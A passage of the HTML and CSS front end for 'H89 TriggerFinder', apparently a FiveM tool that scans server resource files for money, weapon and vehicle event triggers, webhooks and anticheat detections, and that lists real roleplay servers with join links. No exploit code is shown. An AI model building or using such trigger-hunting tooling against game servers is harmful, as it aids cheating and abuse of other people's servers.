 position:fixed;
 z-index:99999;
 min-width:190px;
 padding:8px;
 border-radius:14px;
 background:rgba(10,10,10,.92);
 border:1px solid rgba(255,45,45,.35);
 box-shadow:0 18px 60px rgba(0,0,0,.55);
 backdrop-filter: blur(10px);
 display:none;
 }
 .h89-dd.open{display:block}
 .h89-dd .item{
 width:100%;
 text-align:left;
 padding:10px 10px;
 border-radius:12px;
 border:1px solid rgba(255,255,255,.10);
 background:rgba(255,255,255,.03);
 color:#eaeaea;
 font-weight:800;
 cursor:pointer;
 margin:6px 0;
 }
 .h89-dd .item:hover{border-color:rgba(255,45,45,.55); background:rgba(255,45,45,.10)}
 .h89-dd .meta{
 font-size:11px;
 color:rgba(255,255,255,.70);
 padding:2px 6px 6px;
 }
</style>

<style id="h89-role-modal-style">
 .h89-role-badge{
 display:inline-block;
 margin-top:6px;
 font-size:11px;
 padding:2px 10px;
 border-radius:999px;
 border:1px solid rgba(255,255,255,.12);
 background:rgba(255,255,255,.06);
 font-weight:900;
 letter-spacing:.6px;
 }
 .h89-role-badge.owner{border-color:rgba(255,198,0,.55); background:rgba(255,198,0,.10)}
 .h89-role-badge.admin{border-color:rgba(88,101,242,.55); background:rgba(88,101,242,.12)}
 .h89-role-badge.user{border-color:rgba(255,255,255,.12); background:rgba(255,255,255,.06)}

 .h89-modal{position:fixed; inset:0; z-index:100000; display:none;}
 .h89-modal.open{display:block;}
 .h89-modal-backdrop{position:absolute; inset:0; background:rgba(0,0,0,.55); backdrop-filter: blur(6px);}
 .h89-modal-card{
 position:absolute;
 top:50%; left:50%;
 transform:translate(-50%,-50%);
 width:min(520px, calc(100% - 28px));
 background:rgba(10,10,10,.92);
 border:1px solid rgba(255,45,45,.35);
 border-radius:18px;
 box-shadow:0 26px 90px rgba(0,0,0,.65);
 overflow:hidden;
 }
 .h89-modal-head{
 display:flex; align-items:center; justify-content:space-between;
 padding:14px 16px;
 border-bottom:1px solid rgba(255,255,255,.10);
 }
 .h89-modal-title{font-weight:1000; letter-spacing:1px; color:#ff2d2d}
 .h89-modal-x{
 border:1px solid rgba(255,255,255,.12);
 background:rgba(255,255,255,.04);
 color:#eaeaea;
 padding:8px 10px;
 border-radius:12px;
 cursor:pointer;
 font-weight:900;
 }
 .h89-modal-body{padding:16px}
 .h89-modal-row{display:flex; gap:12px; align-items:center; margin-bottom:14px}
 .h89-modal-avatar{
 width:54px;height:54px;border-radius:999px;
 border:1px solid rgba(255,255,255,.14);
 background:rgba(255,255,255,.06);
 object-fit:cover;
 }
 .h89-modal-name{font-weight:900; font-size:16px}
 .h89-kv{
 display:grid;
 grid-template-columns: 110px 1fr;
 gap:8px 12px;
 padding:12px;
 border:1px solid rgba(255,255,255,.10);
 border-radius:14px;
 background:rgba(0,0,0,.22);
 }
 .h89-kv .k{color:rgba(255,255,255,.70); font-size:12px}
 .h89-kv .v{font-size:12px}
 .h89-kv .mono{font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;}
 .h89-modal-actions{display:flex; gap:10px; margin-top:14px}
 .h89-modal-actions .item{flex:1; margin:0}
</style>

<style id="h89-access-audit-style">
 [data-h89-hidden="1"]{display:none !important;}
</style>

<style id="h89-download-style">
 .h89-btn-download{
 border:1px solid rgba(255,255,255,.14);
 background:rgba(255,255,255,.04);
 color:#fff;
 font-weight:900;
 }
 .h89-btn-download:hover{
 border-color: rgba(27,217,106,.55);
 background: rgba(27,217,106,.12);
 }
</style>

<style>
/* ===== UI Toast Notifications (Card Style) ===== */
#h89-toasts{
 position: fixed;
 top: 20px;
 left: 50%;
 transform: translateX(-50%);
 z-index: 99999;
 display: flex;
 flex-direction: column;
 gap: 14px;
 width: min(720px, calc(100% - 28px));
 pointer-events: none;
}
.h89-toast{
 pointer-events: auto;
 position: relative;
 display: flex;
 align-items: stretch;
 background: #ffffff;
 color: #111827;
 border-radius: 14px;
 border: 1px solid rgba(17,24,39,.08);
 box-shadow: 0 16px 40px rgba(0,0,0,.12);
 overflow: hidden;
 animation: h89ToastIn .18s ease-out;
}
@keyframes h89ToastIn{
 from{opacity:0; transform: translateY(-8px)}
 to{opacity:1; transform: translateY(0)}
}
.h89-toast .bar{ width: 10px; flex: 0 0 10px; }
.h89-toast .content{
 display: flex;
 flex-direction: column;
 padding: 14px 52px 14px 16px;
 gap: 4px;
 flex: 1;
 min-width: 0;
}
.h89-toast .title{
 font-weight: 800;
 font-size: 18px;
 line-height: 1.1;
}
.h89-toast .body{
 font-size: 13px;
 line-height: 1.35;
 color: rgba(17,24,39,.75);
 white-space: pre-line;
 word-break: break-word;
}
.h89-toast .x{
 position: absolute;
 right: 14px;
 top: 50%;
 transform: translateY(-50%);
 width: 34px;
 height: 34px;
 border-radius: 999px;
 border: 1px solid rgba(17,24,39,.12);
 background: rgba(255,255,255,.9);
 color: rgba(17,24,39,.7);
 cursor: pointer;
}
.h89-toast .x:hover{
 color: rgba(17,24,39,.95);
 border-color: rgba(17,24,39,.22);
}
.h89-toast.fiveguard .bar{ background: #ef4444; } /* red */
.h89-toast.electronac .bar{ background: #2563eb; } /* blue */
</style>

<style>
/* ===== FiveGuard/ElectronAC Detected Resources Panel ===== */
#h89-detect-panel-backdrop{
 position: fixed; inset: 0;
 background: rgba(0,0,0,.55);
 backdrop-filter: blur(6px);
 z-index: 99998;
 display: none;
}
#h89-detect-panel{
 position: fixed;
 top: 50%; left: 50%;
 transform: translate(-50%, -50%);
 width: min(920px, calc(100% - 24px));
 max-height: min(78vh, 860px);
 overflow: hidden;
 z-index: 99999;
 display: none;
 border-radius: 18px;
 background: rgba(10,10,10,.92);
 border: 1px solid rgba(255,255,255,.10);
 box-shadow: 0 30px 120px rgba(0,0,0,.65);
}
#h89-detect-panel .hdr{
 display:flex; align-items:center; justify-content:space-between;
 padding: 14px 16px;
 border-bottom: 1px solid rgba(255,255,255,.08);
}
#h89-detect-panel .hdr .t{
 font-weight: 900;
 letter-spacing: .6px;
}
#h89-detect-panel .hdr .sub{
 opacity:.8; font-size: 12px; margin-top:2px;
}
#h89-detect-panel .hdr .x{
 width: 40px; height: 40px;
 border-radius: 999px;
 border: 1px solid rgba(255,255,255,.14);
 background: rgba(255,255,255,.06);
 color:#fff;
 cursor:pointer;
}
#h89-detect-panel .body{
 padding: 14px 16px 16px;
 overflow: auto;
 max-height: calc(78vh - 62px);
}
.h89-detect-grid{
 display:grid;
 grid-template-columns: 1fr 1fr;
 gap: 14px;
}
@media (max-width: 820px){ .h89-detect-grid{ grid-template-columns: 1fr; } }
.h89-detect-card{
 border-radius: 16px;
 border: 1px solid rgba(255,255,255,.10);
 background: rgba(255,255,255,.04);
 overflow: hidden;
}
.h89-detect-card .ch{
 display:flex; align-items:center; justify-content:space-between;
 padding: 12px 12px;
 border-bottom: 1px solid rgba(255,255,255,.08);
}
.h89-detect-card .ch .label{ font-weight: 900; }
.h89-pill{
 font-size: 12px;
 padding: 4px 10px;
 border-radius: 999px;
 border: 1px solid rgba(255,255,255,.14);
 background: rgba(0,0,0,.35);
 opacity:.95;
}
.h89-detect-list{
 padding: 10px 12px 12px;
 display:flex;
 flex-direction:column;
 gap: 8px;
}
.h89-detect-row{
 display:flex;
 gap: 10px;
 align-items:flex-start;
 padding: 10px 10px;
 border-radius: 12px;
 border: 1px solid rgba(255,255,255,.08);
 background: rgba(0,0,0,.25);
}
.h89-detect-row .dot{
 width: 10px; height: 10px;
 border-radius: 999px;
 margin-top: 5px;
 flex: 0 0 10px;
}
.h89-detect-row .meta{ flex:1; min-width:0; }
.h89-detect-row .name{ font-weight: 800; }
.h89-detect-row .small{
 opacity: .80;
 font-size: 12px;
 white-space: pre-line;
 word-break: break-word;
}
.h89-detect-row .count{
 margin-left:auto;
 font-weight: 900;
 opacity:.95;
}
.dot.fg{ background:#ef4444; }
.dot.ea{ background:#2563eb; }
</style>

<style>
/* ===== Detected Resources Button (near FiveGuard tab) ===== */
#h89-open-detections-btn{
 margin-left: 10px;
 padding: 10px 14px;
 border-radius: 14px;
 border: 1px solid rgba(255,255,255,.14);
 background: rgba(255,255,255,.06);
 color: #fff;
 font-weight: 900;
 letter-spacing: .4px;
 cursor: pointer;
}
#h89-open-detections-btn:hover{
 background: rgba(255,255,255,.10);
}
</style>

<style>
/* ===== H89 SNOW DISABLED ===== */
.snowflake, .snowflake.special { display:none !important; }
</style>

<style>
/* ===== H89 UI UPDATE PACK (Topbar + Cards + Results + Panels + Toasts) ===== */
:root{
 --h89-radius-lg: 18px;
 --h89-radius-md: 14px;
 --h89-radius-sm: 12px;
 --h89-border: rgba(255,255,255,.12);
 --h89-border2: rgba(255,255,255,.08);
 --h89-surface: rgba(255,255,255,.04);
 --h89-text-dim: rgba(255,255,255,.78);
}

/* Tabs */
nav button, nav a, .tab, .tabs button, .tabs a{
 border-radius: 999px !important;
 padding: 10px 16px !important;
 border: 1px solid var(--h89-border) !important;
 background: rgba(255,255,255,.05) !important;
 transition: transform .08s ease, background .15s ease, border-color .15s ease;
 letter-spacing: .3px;
}
nav button:hover, nav a:hover, .tab:hover, .tabs button:hover, .tabs a:hover{
 background: rgba(255,255,255,.09) !important;
}
nav button:active, nav a:active{ transform: translateY(1px); }
nav button.active, nav a.active,
nav button[aria-selected="true"], nav a[aria-selected="true"],
nav button[aria-current="page"], nav a[aria-current="page"],
nav button.is-active, nav a.is-active{
 background: rgba(220,38,38,.16) !important;
 border-color: rgba(220,38,38,.55) !important;
}

/* Stats cards */
.stat, .stat-card, .metric, .kpi{
 border-radius: var(--h89-radius-lg) !important;
 border: 1px solid var(--h89-border2) !important;
 background: rgba(255,255,255,.04) !important;
 padding: 14px 14px !important;
}
.stat .value, .stat-card .value, .metric .value, .kpi .value,
.stat .number, .stat-card .number{
 font-size: 26px !important;
 font-weight: 900 !important;
 letter-spacing: .6px;
}
.stat .label, .stat-card .label, .metric .label, .kpi .label,
.stat .name, .stat-card .name{
 font-size: 11px !important;
 opacity: .78 !important;
 text-transform: uppercase;
 letter-spacing: 1px;
}

/* Result cards */
.result, .result-card, .trigger-card, .webhook-card, .card{
 border-radius: var(--h89-radius-lg) !important;
 border: 1px solid var(--h89-border2) !important;
 background: rgba(255,255,255,.03) !important;
}
.result:hover, .result-card:hover, .trigger-card:hover, .webhook-card:hover{
 border-color: rgba(220,38,38,.35) !important;
}
.result .folder, .result-card .folder, .trigger-card .folder{
 color: var(--h89-text-dim) !important;
 font-size: 12px !important;
 white-space: nowrap;
 overflow: hidden;
 text-overflow: ellipsis;
}
.copy-btn, .btn-copy, .copy, button.copy{
 border-radius: 12px !important;
 padding: 8px 12px !important;
 border: 1px solid rgba(220,38,38,.45) !important;
 background: rgba(220,38,38,.12) !important;
}
.copy-btn:hover, .btn-copy:hover, .copy:hover, button.copy:hover{
 background: rgba(220,38,38,.18) !important;
}

/* Panels */
.modal, .panel, .drawer, .popup, #cfx-modal, #h89-detect-panel{
 border-radius: 20px !important;
 border: 1px solid rgba(255,255,255,.12) !important;
 box-shadow: 0 30px 120px rgba(0,0,0,.65) !important;
}
.modal-backdrop, .backdrop, #h89-detect-panel-backdrop{
 background: rgba(0,0,0,.55) !important;
 backdrop-filter: blur(8px) !important;
}

/* Toasts */
#h89-toasts{
 position: fixed;
 top: 18px;
 right: 18px;
 z-index: 100000;
 display: flex;
 flex-direction: column;
 gap: 12px;
 pointer-events: none;
}
.h89-toast{
 width: min(420px, calc(100vw - 36px));
 border-radius: 14px;
 border: 1px solid rgba(255,255,255,.16);
 background: rgba(18,18,18,.92);
 box-shadow: 0 18px 70px rgba(0,0,0,.55);
 display:flex;
 overflow: hidden;
 pointer-events: auto;
}
.h89-toast .bar{ width: 8px; }
.h89-toast .content{ padding: 14px 14px; flex: 1; min-width: 0; }
.h89-toast .title{ font-weight: 900; font-size: 16px; margin-bottom: 4px; }
.h89-toast .msg{ font-size: 12px; opacity: .82; white-space: pre-line; word-break: break-word; }
.h89-toast .x{
 width: 38px; height: 38px; margin: 10px;
 border-radius: 12px;
 border: 1px solid rgba(255,255,255,.14);
 background: rgba(255,255,255,.06);
 color: #fff;
 cursor:pointer;
}
.h89-toast.success .bar{ background: #22c55e; }
.h89-toast.info .bar{ background: #3b82f6; }
.h89-toast.warn .bar{ background: #f59e0b; }
.h89-toast.error .bar{ background: #ef4444; }
</style>


<style>
.h89-toast{
 position:fixed; top:20px; left:50%; transform:translateX(-50%);
 background:#111; color:#fff; padding:14px 22px;
 border-left:6px solid #ff1a1a;
 box-shadow:0 0 20px rgba(255,0,0,.7);
 z-index:99999; font-weight:700;
 animation:pop 0.4s ease, pulse 1.5s infinite;
}
@keyframes pop{from{transform:translateX(-50%) scale(.8);opacity:0}to{transform:translateX(-50%) scale(1);opacity:1}}
@keyframes pulse{0%{box-shadow:0 0 10px red}50%{box-shadow:0 0 30px red}100%{box-shadow:0 0 10px red}}
</style>



<style>
/* Notification toggles */
#h89-notify-settings{
  position: fixed;
  right: 18px;
  bottom: 86px;
  z-index: 99999;
  display: none;
  width: 280px;
  border-radius: 16px;
  border: 1px solid rgba(255,255,255,.14);
  background: rgba(15,15,15,.92);
  backdrop-filter: blur(8px);
  box-shadow: 0 18px 70px rgba(0,0,0,.55);
  padding: 12px;
}
#h89-notify-settings .row{
  display:flex; align-items:center; justify-content:space-between;
  padding: 10px 8px;
  border-radius: 12px;
  border: 1px solid rgba(255,255,255,.08);
  background: rgba(255,255,255,.03);
  margin-bottom: 10px;
}
#h89-notify-settings .row:last-child{ margin-bottom: 0; }
#h89-notify-settings .label{
  font-weight: 800;
  letter-spacing: .3px;
}
.h89-switch{
  width: 52px; height: 28px;
  border-radius: 999px;
  border: 1px solid rgba(255,255,255,.18);
  background: rgba(255,255,255,.08);
  position: relative;
  cursor:pointer;
}
.h89-switch .dot{
  width: 22px; height: 22px;
  border-radius: 999px;
  position:absolute; top: 2px; left: 2px;
  background: rgba(255,255,255,.88);
  transition: left .15s ease, background .15s ease;
}
.h89-switch.on{
  background: rgba(220,38,38,.20);
  border-color: rgba(220,38,38,.55);
}
.h89-switch.on .dot{ left: 28px; background: #fff; }
</style>


<style>
/* CFX Button Force Visible */
#h89-open-cfx{display:inline-flex !important; visibility:visible !important; opacity:1 !important;}
</style>

<style>
/* ===== CFX Finder PRO Styles ===== */
.cfx-modal{position:fixed;inset:0;z-index:99999;font-family:inherit;}
.cfx-backdrop{position:absolute;inset:0;background:rgba(0,0,0,.62);backdrop-filter:blur(8px);}
.cfx-shell{position:relative;max-width:980px;margin:6vh auto;background:rgba(12,12,12,.92);border:1px solid rgba(255,255,255,.14);
  border-radius:22px;box-shadow:0 40px 140px rgba(0,0,0,.75);overflow:hidden;}
.cfx-head{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:16px 18px;border-bottom:1px solid rgba(255,255,255,.10);
  background:linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.02));}
.cfx-title .t{font-weight:900;letter-spacing:.3px;font-size:18px;color:#fff;}
.cfx-title .s{opacity:.75;font-size:12px;margin-top:2px;}
.cfx-actions{display:flex;gap:10px;align-items:center;}
.cfx-body{padding:16px 18px 18px;}
.cfx-input-row{display:flex;gap:12px;align-items:stretch;}
.cfx-input-wrap{flex:1;min-width:0;}
.cfx-input{width:100%;border-radius:16px;border:1px solid rgba(255,255,255,.14);
  background:rgba(255,255,255,.04);color:#fff;padding:12px 14px;outline:none;font-weight:700;letter-spacing:.2px;}
.cfx-input::placeholder{color:rgba(255,255,255,.35);font-weight:600;}
.cfx-hint{margin-top:8px;font-size:12px;opacity:.6}
.cfx-btn{border-radius:14px;border:1px solid rgba(255,255,255,.14);background:rgba(255,255,255,.06);color:#fff;
  padding:10px 14px;font-weight:800;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:8px;}
.cfx-btn:hover{background:rgba(255,255,255,.10);}
.cfx-btn.primary{background:rgba(59,130,246,.22);border-color:rgba(59,130,246,.55);}
.cfx-btn.primary:hover{background:rgba(59,130,246,.30);}
.cfx-btn.ghost{background:rgba(255,255,255,.04);}
.cfx-btn.tiny{padding:6px 10px;border-radius:12px;font-size:12px;font-weight:900;}
.cfx-status{margin-top:14px;border:1px solid rgba(255,255,255,.10);background:rgba(255,255,255,.03);border-radius:16px;padding:12px 14px;font-size:13px;}
.cfx-status.ok{border-color:rgba(34,197,94,.35);}
.cfx-status.err{border-color:rgba(239,68,68,.45);}
.cfx-status .b{font-weight:900;}
.cfx-result{margin-top:14px;}
.cfx-card{border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.03);border-radius:18px;padding:14px;}
.cfx-card-head{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;}
.cfx-server-name{font-weight:950;font-size:18px;letter-spacing:.2px;color:#fff;}
.cfx-badges{display:flex;gap:8px;flex-wrap:wrap;justify-content:flex-end;}
.cfx-badge{font-size:12px;font-weight:900;padding:6px 10px;border-radius:999px;border:1px solid rgba(255,255,255,.12);background:rgba(0,0,0,.22);opacity:.95;color:#fff;}
.cfx-meta{margin-top:12px;display:grid;gap:10px;}
.cfx-meta-row{display:grid;grid-template-columns:120px 1fr;gap:10px;align-items:center;}
.cfx-meta-row .k{opacity:.65;font-weight:800;font-size:12px;color:rgba(255,255,255,.8);}
.cfx-meta-row .v{display:flex;gap:10px;align-items:center;flex-wrap:wrap;min-width:0;color:#fff;}
.cfx-link{color:#93c5fd;text-decoration:none;font-weight:900;}
.cfx-link:hover{text-decoration:underline;}
.cfx-code{display:inline-block;max-width:100%;overflow:auto;padding:6px 10px;border-radius:12px;
  background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.10);color:#fff;}
.cfx-tags{display:flex;gap:8px;flex-wrap:wrap;}
.cfx-tag{font-size:11px;font-weight:900;padding:6px 10px;border-radius:999px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.04);opacity:.9;color:#fff;}
.cfx-split{margin-top:12px;display:grid;grid-template-columns:repeat(4, minmax(0, 1fr));gap:10px;}
.cfx-box{border:1px solid rgba(255,255,255,.10);background:rgba(0,0,0,.18);border-radius:16px;padding:10px 12px;color:#fff;}
.cfx-box .h{opacity:.65;font-weight:900;font-size:11px;margin-bottom:6px;}
.cfx-box .p{font-weight:850;font-size:13px;word-break:break-word;}
.cfx-footnote{margin-top:10px;font-size:11px;opacity:.55;color:#fff;}
@media (max-width: 860px){
  .cfx-shell{margin:3vh 12px;}
  .cfx-input-row{flex-direction:column;}
  .cfx-meta-row{grid-template-columns:1fr;}
  .cfx-split{grid-template-columns:repeat(2, minmax(0, 1fr));}
}

/* Banner / Cover */
.h89-cfx-hero{margin-top:12px;border-radius:16px;overflow:hidden;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.03);}
.h89-cfx-hero img{display:block;width:100%;height:170px;object-fit:cover;}
</style>


<style>
/* CFX V3 Extras */
.cfx-banner{width:100%;height:160px;border-radius:16px;overflow:hidden;border:1px solid rgba(255,255,255,.10);
  background:rgba(0,0,0,.25);margin-bottom:12px;position:relative;}
.cfx-banner img{width:100%;height:100%;object-fit:cover;display:block;filter:saturate(1.05) contrast(1.05);}
.cfx-players{margin-top:12px;border:1px solid rgba(255,255,255,.10);background:rgba(0,0,0,.18);border-radius:16px;padding:10px 12px;color:#fff;}
.cfx-players .ph{font-weight:950;letter-spacing:.2px;margin-bottom:4px;}
.cfx-players .psub{opacity:.7;font-size:12px;margin-bottom:10px;}
.cfx-players .plist{display:grid;grid-template-columns:repeat(2, minmax(0, 1fr));gap:8px;}
.cfx-player{border:1px solid rgba(255,255,255,.10);background:rgba(255,255,255,.03);border-radius:14px;padding:8px 10px;
  display:flex;align-items:center;justify-content:space-between;gap:10px;}
.cfx-player .n{font-weight:900;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.cfx-player .id{opacity:.65;font-size:12px;font-weight:800;}
#cfxFavBtn.is-fav{background:rgba(245,158,11,.18);border-color:rgba(245,158,11,.55);}
#cfxFavBtn.is-fav:hover{background:rgba(245,158,11,.26);}
@media (max-width:860px){ .cfx-players .plist{grid-template-columns:1fr;} .cfx-banner{height:140px;} }

/* ===== H89 Protection Checks Slide Panel ===== */
.h89-panel-backdrop{
  position:fixed; inset:0; z-index:99990;
  background:rgba(0,0,0,.55);
  backdrop-filter: blur(6px);
}
.h89-slidepanel{
  position:fixed; top:0; right:0; height:100vh; width:min(420px, 92vw);
  z-index:99991;
  background: rgba(10,10,10,.92);
  border-left:1px solid rgba(255,45,45,.25);
  box-shadow: -25px 0 80px rgba(0,0,0,.7);
  display:flex; flex-direction:column;
}
.h89-slidehead{
  padding:14px;
  display:flex; align-items:center; justify-content:space-between; gap:10px;
  border-bottom:1px solid rgba(255,255,255,.10);
}
.h89-slidetitle{font-weight:900; letter-spacing:.5px}
.h89-slidesub{opacity:.75; font-size:12px; margin-top:3px}
.h89-slidebody{padding:14px; overflow:auto; display:flex; flex-direction:column; gap:12px}
.h89-slidefoot{padding:14px; border-top:1px solid rgba(255,255,255,.10)}
.h89-protect-card{
  border:1px solid rgba(255,255,255,.10);
  background: rgba(255,255,255,.03);
  border-radius:16px;
  padding:12px;
}
.h89-protect-row{display:flex; align-items:center; justify-content:space-between; gap:10px}
.h89-badgecount{
  padding:3px 10px; border-radius:999px;
  border:1px solid rgba(255,255,255,.12);
  background: rgba(255,255,255,.06);
  font-size:12px; font-weight:900;
}
.h89-protect-list{margin-top:10px; display:flex; flex-direction:column; gap:8px}
.h89-protect-item{
  padding:10px; border-radius:14px;
  border:1px solid rgba(255,255,255,.10);
  background: rgba(0,0,0,.20);
  display:flex; justify-content:space-between; gap:10px;
}
.h89-protect-item small{opacity:.75}

</style>

</head>

<body>

<header class="h89-topbar">
  <div class="h89-topbar-left">
    <img class="h89-logo" src="chomik.jpg" alt="logo" />
    <div class="h89-brand">
      <div class="h89-brand-title">H89 TriggerFinder</div>
      <div class="h89-brand-sub" id="h89TopSub">Secure ‚Ä¢ Fast ‚Ä¢ Pro</div>
    </div>
  </div>

  <div class="h89-topbar-right">
    <button class="h89-bell" id="h89BellBtn" type="button" title="Notifications">
      <i class="fa-solid fa-bell"></i>
      <span class="h89-bell-badge" id="h89BellCount" style="display:none">0</span>
    </button>

    <div class="h89-prof">
      <img class="h89-prof-ava" id="h89TopAvatar" src="" alt="avatar" />
      <span class="h89-prof-role" id="h89TopRole">GUEST</span>
    </div>

    <span class="h89-chip" id="h89TopStatus">‚óè READY</span>
  </div>
</header>
<div id="h89NotifyDrawer" class="h89-notify-drawer hidden" aria-hidden="true"></div>

<div id="h89-toasts" aria-live="polite" aria-atomic="true"></div>
<script>
 // ===== CFX Servers List (edit here) =====
window.H89_CFX_SERVERS = [
 { name: "Evolution Roleplay", join: "https://cfx.re/join/r7397j" },
 { name: "Divine Roleplay", join: "https://cfx.re/join/8r8qxv" },
 { name: "Unity Roleplay", join: "https://cfx.re/join/xma33e" },
 { name: "MOON Roleplay", join: "https://cfx.re/join/e78pzp" },
 { name: "Ceylon Roleplay", join: "https://cfx.re/join/r6r5mg" }
];

</script>

 <!-- Video Background - Use consistent ID and source -->
 <video id="video-bg" autoplay="" muted="" loop="" playsinline="">
 <source src="" type="video/mp4"> <!-- Match skidTriggerCreator video -->
 Your browser does not support the video tag.
 </video>

 <!-- Click to Start Overlay - Use consistent structure -->
 <div id="text-overlay">
 <p id="click-text">Click to Start</p>
 </div>

 <!-- Mute Button - Use consistent structure -->
 <button id="mute-button" aria-label="Toggle sound">
 <i class="fas fa-volume-high"></i> <!-- Font Awesome icon -->
 </button>

 <!-- Main Content Wrapper -->
 <div class="main-wrapper">
 <div class="container">
 <!-- Finder App as a component -->
 <div id="finder-app" class="component">
 <div id="h89-toolbar" class="h89-toolbar">
 <div class="h89-toolbar-left">
 <div class="h89-badge">H89</div>
 <div class="h89-toolbar-title">TriggerFinder</div>
 <div class="h89-toolbar-right">
  <span class="h89-theme-dot" aria-hidden="true"></span>
  <select id="toolbarTheme" class="h89-theme-select" title="Toolbar theme">
    <option value="red">Red</option>
    <option value="blue">Blue</option>
    <option value="purple">Purple</option>
    <option value="green">Green</option>
    <option value="amber">Amber</option>
  </select>
 </div>
 <div class="h89-toolbar-sub" id="h89-session">Session: <span id="h89-session-state">locked</span>

<span id="h89DiscordHeader" class="h89-discord-wrap h89-header-anim" title="Click for Profile / Logout">
 <img id="h89Avatar" class="h89-discord-avatar" alt="Discord avatar" />
 <span id="h89Name" class="h89-discord-name">Loading...</span> <span id="h89Role" class="h89-role-badge user">USER</span> <span id="h89Expiry" class="h89-expiry-badge">--</span>
</span>
<div id="h89Dropdown" class="h89-dd" aria-hidden="true">
 <div class="meta" id="h89DropMeta">...</div>
 <button class="item" id="h89BtnProfile" type="button">PROFILE</button>
 <button class="item" id="h89BtnLogout" type="button">LOGOUT</button>
</div>
</div>
 </div>
 <div class="h89-toolbar-actions">
 <button class="h89-tbtn" id="h89-jump-search" title="Focus search (Ctrl+K)">Search</button>
 <button class="h89-tbtn" id="h89-jump-files" title="Open file picker">Files</button>
 <button class="h89-tbtn" id="h89-jump-filters" title="Open filters">Filters</button>
 <button class="h89-tbtn" id="h89ProtectBtn" title="Protection checks">üõ° PROTECTION <span id="h89ProtectCount" class="h89-countpill" style="display:none">(0)</span></button>
 <button class="h89-tbtn" id="h89-toggle-webhooks" title="Toggle Webhooks panel (W)">LOGS OFF</button>
 <button class="h89-tbtn" id="h89-filter-fiveguard" title="Show only FiveGuard detections">FiveGuard</button>
 <button class="h89-tbtn" id="h89-open-detections-btn" title="Open detections panel (Ctrl+Shift+D)" onclick="try{window.__h89OpenDetectPanel&&window.__h89OpenDetectPanel()}catch(e){}">Detections</button>
 <button class="h89-tbtn" id="h89-open-highrisk" title="High-Risk resources (Ctrl+Shift+H)">High-Risk</button>
 <button class="h89-chip" id="h89-open-cfx" title="Open CFX panel" class="h89-tbtn" style="display:inline-flex;align-items:center;gap:8px;">CFX Finder</button>
 <button id="h89DownloadBtn" class="h89-btn h89-btn-download" type="button" title="Download file">DOWNLOAD</button>
<button class="h89-tbtn h89-primary" id="h89-export" title="Export results">Export</button>
 </div>
</div>
 
<!-- Advanced Filters Panel -->
<div id="h89FiltersPanel" class="h89-filters-panel" aria-hidden="true">
  <div class="h89-filters-head">
    <div class="h89-filters-title"><i class="fa-solid fa-sliders"></i> Advanced Filters</div>
    <button class="h89-filters-close" id="h89FiltersClose" type="button" title="Close">‚úï</button>
  </div>

  <div class="h89-filters-grid">
    <label class="h89-filters-field">
      <span>RISK</span>
      <select id="h89FilterRisk">
        <option value="any">Any</option>
        <option value="high">High</option>
        <option value="low">Low</option>
      </select>
    </label>

    <label class="h89-filters-field">
      <span>TYPE</span>
      <select id="h89FilterType">
        <option value="any">Any</option>
      </select>
    </label>

    <label class="h89-filters-field h89-filters-wide">
      <span>FILE / FOLDER</span>
      <input id="h89FilterFile" type="text" placeholder="e.g. server/main.lua or cyberanticheat" />
    </label>
  </div>

  <div class="h89-filters-actions">
    <button class="h89-filters-btn" id="h89FiltersClear" type="button">Clear</button>
    <button class="h89-filters-btn primary" id="h89FiltersApply" type="button">Apply</button>
  </div>
</div>


<!-- Changed ID, added class -->
 <h1><i class="fas fa-search"></i>No name</h1> <!-- Added icon -->

 <!-- Stats Container -->
 <div class="stats-container" id="stats-container">
  <div class="stat-card" data-stat="triggers">
    <div class="stat-top">
      <span class="stat-label">TRIGGERS</span>
      <span class="stat-chip" id="statRisk">LIVE</span>
    </div>
    <div class="stat-value" id="triggers-count">0</div>
    <div class="stat-sub">Found in scan</div>
  </div>

  <div class="stat-card" data-stat="webhooks">
    <div class="stat-top">
      <span class="stat-label">WEBHOOKS</span>
      <span class="stat-chip muted">URL</span>
    </div>
    <div class="stat-value" id="webhooks-count">0</div>
    <div class="stat-sub">Detected links</div>
  </div>

  <div class="stat-card" data-stat="fiveguard">
    <div class="stat-top">
      <span class="stat-label">FIVEGUARD RISK</span>
      <span class="stat-chip" style="border-color: rgba(255,42,42,.65); background: rgba(255,42,42,.12); color:#ff4d4d;">RISK</span>
    </div>
    <div class="stat-value" id="fiveguard-count">0</div>
    <div class="stat-sub">High-risk resources</div>
  </div>

  <div class="stat-card wide" data-stat="files">
    <div class="stat-top">
      <span class="stat-label">FILES SCANNED</span>
      <span class="stat-chip" id="statSpeedChip">0 files/s</span>
    </div>
    <div class="stat-value" id="files-count">0</div>
    <div class="stat-sub" id="statFilesSub">Ready</div>
  </div>

  <div class="stat-card" data-stat="shops">
    <div class="stat-top">
      <span class="stat-label">SHOPS</span>
      <span class="stat-chip muted">CFG</span>
    </div>
    <div class="stat-value" id="shops-count">0</div>
    <div class="stat-sub">Shop entries</div>
  </div>

  <div class="stat-card" data-stat="coords">
    <div class="stat-top">
      <span class="stat-label">COORDINATES</span>
      <span class="stat-chip muted">VEC</span>
    </div>
    <div class="stat-value" id="coords-count">0</div>
    <div class="stat-sub">Locations</div>
  </div>
</div>

 <!-- Search and Filter Row -->
 <div class="search-filter-row">
 <input type="text" id="search" placeholder="Search triggers or script folders...">
 <button id="search-button"><i class="fas fa-search"></i> Search</button> <!-- Added icon -->
 <div class="dropdown">
 <button><i class="fas fa-filter"></i> Filters</button> <!-- Added icon -->
 <div class="dropdown-content" id="filters">
 <!-- Filter checkboxes remain the same -->
 <label><input type="checkbox" id="filter-money" value="money"> Money
 <div class="filter-explanation">Triggers related to money transactions.</div>
 </label>
 <label><input type="checkbox" id="filter-weapon" value="weapon"> Weapon
 <div class="filter-explanation">Triggers related to weapons or weapon spawns.</div>
 </label>
 <label><input type="checkbox" id="filter-vehicle" value="vehicle"> Vehicle
 <div class="filter-explanation">Triggers related to vehicles or vehicle spawns.</div>
 </label>
 <label><input type="checkbox" id="filter-job" value="job"> Job
